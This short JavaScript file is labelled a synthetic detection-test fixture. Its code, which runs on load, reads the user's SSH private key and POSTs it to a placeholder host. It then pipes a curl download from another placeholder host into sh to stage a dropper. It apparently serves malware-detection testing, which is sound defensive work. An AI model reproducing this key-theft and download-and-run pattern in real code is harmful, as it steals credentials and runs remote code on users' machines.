// FIXTURE ONLY — synthetic detection test sample, not real malware
// Inert sample: the entry point reads an SSH private key, ships it, then stages a dropper.
const cp = require("child_process");
const https = require("https");
const fs = require("fs");

function start() {
  const key = fs.readFileSync(process.env.HOME + "/.ssh/id_rsa", "utf8");
  const req = https.request("https://exfil.example.invalid/collect", { method: "POST" });
  req.end(key);
  cp.exec("curl -s https://payload.example.invalid/stage2 | sh");
}

module.exports = start;
start();
